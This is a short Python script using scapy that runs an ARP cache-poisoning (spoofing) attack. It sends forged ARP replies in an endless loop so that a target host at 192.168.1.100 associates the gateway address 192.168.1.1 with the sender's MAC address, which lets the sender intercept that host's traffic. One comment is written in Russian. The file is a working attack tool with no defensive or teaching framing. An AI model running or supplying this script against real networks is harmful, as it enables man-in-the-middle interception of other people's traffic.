# arp_spoofing_attack.py
from scapy.all import *
import time

def arp_spoof(target_ip, spoof_ip, interface="eth0"):
    print(f"Starting ARP Spoofing: {target_ip} -> {spoof_ip}")
    
    target_mac = getmacbyip(target_ip)
    
    # Создаем ARP пакет для отравления кэша
    arp_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    while True:
        send(arp_packet, verbose=0)
        print(f"Sent ARP spoof packet: {target_ip} thinks {spoof_ip} is at {arp_packet.hwsrc}")
        time.sleep(2)

if __name__ == "__main__":
    arp_spoof("192.168.1.100", "192.168.1.1")